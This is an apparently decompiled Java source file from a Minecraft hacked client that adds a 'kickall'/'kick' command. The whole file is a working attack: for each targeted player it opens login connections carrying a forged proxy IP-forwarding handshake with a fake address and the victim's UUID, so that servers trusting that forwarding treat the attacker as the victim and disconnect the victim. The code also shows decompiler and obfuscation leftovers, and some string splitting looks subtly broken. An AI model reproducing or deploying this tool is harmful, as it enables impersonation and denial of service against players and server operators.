package remix.command;

import net.minecraft.client.gui.GuiIngameMenu;
import net.minecraft.client.gui.GuiPlayerTabOverlay;
import net.minecraft.client.network.ClientPlayHandler;
import net.minecraft.client.network.NetHandlerLoginClient;
import net.minecraft.client.network.PlayerInfo;
import net.minecraft.network.ConnectionState;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.handshake.client.C00Handshake;
import net.minecraft.network.login.client.C00PacketLoginStart;
import remix.command.AbstractClientCommand;

import java.net.InetAddress;
import java.util.Random;

public final class KickallClientCommand extends AbstractClientCommand {
    private String targetServerAddress;

    private static String[] packedTextFragments;

    public KickallClientCommand() {
        super("Kickall", new String[] {"kickall", "kick"});
        this.addMinimumArgumentsAction(
                "setkick",
                3,
                new String[] {"setkick", "st"},
                astring -> {
                    this.targetServerAddress = astring[2];
                    ClientCommandManager.printMessage("Target server IP set to: " + astring[2]);
                    return true;
                });
        this.addMinimumArgumentsAction(
                "kickall",
                3,
                new String[] {"kickall", "ka"},
                astring -> {
                    String text = astring[2];
                    new Thread(
                                    () -> {
                                        boolean flag =
                                                TargetsClientCommand.usesLegacyTargetFlow();

                                        try {
                                            Random random = new Random();
                                            int i =
                                                    Integer.parseInt(
                                                            text.split(packedTextFragments[7])[1]);
                                            ClientPlayHandler clientPlayHandler =
                                                    ec.player.connection;

                                            for (java.util.Iterator<?> __recoveryIterator171_6938 =
                                                            (GuiPlayerTabOverlay.PLAYER_ORDER.sortedCopy(
                                                                            clientPlayHandler
                                                                                    .getPlayerInfoMap()))
                                                                    .iterator();
                                                    (__recoveryIterator171_6938).hasNext(); ) {
                                                PlayerInfo playerInfo =
                                                        (PlayerInfo)
                                                                (__recoveryIterator171_6938).next();
                                                if (!playerInfo
                                                        .getGameProfile()
                                                        .getName()
                                                        .equalsIgnoreCase(ec.player.getName())) {
                                                    InetAddress inetaddress =
                                                            InetAddress.getByName(
                                                                    text.split(
                                                                                    packedTextFragments[
                                                                                            8])[0]);
                                                    int j = 0;

                                                    while (j < 5) {
                                                        NetworkManager networkManager =
                                                                NetworkManager
                                                                        .createNetworkManagerAndConnect(
                                                                                inetaddress,
                                                                                i,
                                                                                true);
                                                        networkManager.setPacketHandler(
                                                                new NetHandlerLoginClient(
                                                                        networkManager,
                                                                        ec,
                                                                        new GuiIngameMenu()));
                                                        networkManager.sendPacket(
                                                                new C00Handshake(
                                                                        47,
                                                                        text.split(
                                                                                                packedTextFragments[
                                                                                                        9])[
                                                                                        0]
                                                                                + "\u000032.123."
                                                                                + random.nextInt(
                                                                                        255)
                                                                                + packedTextFragments[
                                                                                        10]
                                                                                + random.nextInt(
                                                                                        255)
                                                                                + packedTextFragments[
                                                                                        11]
                                                                                + playerInfo
                                                                                        .getGameProfile()
                                                                                        .getId()
                                                                                        .toString(),
                                                                        i,
                                                                        ConnectionState.LOGIN));
                                                        networkManager.sendPacket(
                                                                new C00PacketLoginStart(
                                                                        playerInfo
                                                                                .getGameProfile()));
                                                        j++;
                                                        if (flag) {
                                                            break;
                                                        }
                                                    }
                                                }

                                                if (flag) {
                                                    break;
                                                }
                                            }

                                            ClientCommandManager.printMessage("Kicked all!");
                                        } catch (Exception exception) {
                                            ClientCommandManager.printMessage(this.getUsage());
                                        }
                                    })
                            .start();
                    return true;
                });
        this.addMinimumArgumentsAction(
                "kick",
                3,
                new String[] {"kick", packedTextFragments[0]},
                astring -> {
                    String text = astring[2];
                    new Thread(
                                    () -> {
                                        boolean flag = TargetsClientCommand.isStandardTargetFlow();

                                        try {
                                            Random random = new Random();
                                            ClientPlayHandler clientPlayHandler =
                                                    ec.player.connection;

                                            for (java.util.Iterator<?> __recoveryIterator171_10193 =
                                                            (GuiPlayerTabOverlay.PLAYER_ORDER.sortedCopy(
                                                                            clientPlayHandler
                                                                                    .getPlayerInfoMap()))
                                                                    .iterator();
                                                    (__recoveryIterator171_10193).hasNext(); ) {
                                                PlayerInfo playerInfo =
                                                        (PlayerInfo)
                                                                (__recoveryIterator171_10193)
                                                                        .next();
                                                if (playerInfo
                                                        .getGameProfile()
                                                        .getName()
                                                        .equalsIgnoreCase(text)) {
                                                    int i =
                                                            Integer.parseInt(
                                                                    this.targetServerAddress
                                                                            .split(
                                                                                    packedTextFragments[
                                                                                            1])[1]);
                                                    InetAddress inetaddress =
                                                            InetAddress.getByName(
                                                                    this.targetServerAddress
                                                                            .split(
                                                                                    packedTextFragments[
                                                                                            2])[0]);
                                                    int j = 0;

                                                    while (j < 5) {
                                                        NetworkManager networkManager =
                                                                NetworkManager
                                                                        .createNetworkManagerAndConnect(
                                                                                inetaddress,
                                                                                i,
                                                                                true);
                                                        networkManager.setPacketHandler(
                                                                new NetHandlerLoginClient(
                                                                        networkManager,
                                                                        ec,
                                                                        new GuiIngameMenu()));
                                                        networkManager.sendPacket(
                                                                new C00Handshake(
                                                                        47,
                                                                        text.split(
                                                                                                packedTextFragments[
                                                                                                        3])[
                                                                                        0]
                                                                                + "\u000032.123."
                                                                                + random.nextInt(
                                                                                        255)
                                                                                + packedTextFragments[
                                                                                        4]
                                                                                + random.nextInt(
                                                                                        255)
                                                                                + packedTextFragments[
                                                                                        5]
                                                                                + playerInfo
                                                                                        .getGameProfile()
                                                                                        .getId()
                                                                                        .toString(),
                                                                        i,
                                                                        ConnectionState.LOGIN));
                                                        networkManager.sendPacket(
                                                                new C00PacketLoginStart(
                                                                        playerInfo
                                                                                .getGameProfile()));
                                                        j++;
                                                        if (!flag) {
                                                            break;
                                                        }
                                                    }

                                                    ClientCommandManager.printMessage(
                                                            "Kicked "
                                                                    + playerInfo
                                                                            .getGameProfile()
                                                                            .getName()
                                                                    + packedTextFragments[6]);
                                                }

                                                if (!flag) {
                                                    break;
                                                }
                                            }
                                        } catch (Exception exception) {
                                            ClientCommandManager.printMessage(this.getUsage());
                                        }
                                    })
                            .start();
                    return true;
                });
    }

    static {
        remix.command.KickallClientCommand.packedTextFragments = new String[14];
        remix.command.KickallClientCommand.packedTextFragments[0] = new String("k");
        remix.command.KickallClientCommand.packedTextFragments[1] = new String(":");
        remix.command.KickallClientCommand.packedTextFragments[2] = new String(":");
        remix.command.KickallClientCommand.packedTextFragments[3] = new String(":");
        remix.command.KickallClientCommand.packedTextFragments[4] = new String(".");
        remix.command.KickallClientCommand.packedTextFragments[5] = new String("\u0000");
        remix.command.KickallClientCommand.packedTextFragments[6] = new String(".");
        remix.command.KickallClientCommand.packedTextFragments[7] = new String(":");
        remix.command.KickallClientCommand.packedTextFragments[8] = new String(":");
        remix.command.KickallClientCommand.packedTextFragments[9] = new String(":");
        remix.command.KickallClientCommand.packedTextFragments[10] = new String(".");
        remix.command.KickallClientCommand.packedTextFragments[11] = new String("\u0000");
    }

    public String getUsage() {
        return "kickall <setkick/kickall/kick> <ip:port/nick>";
    }
}
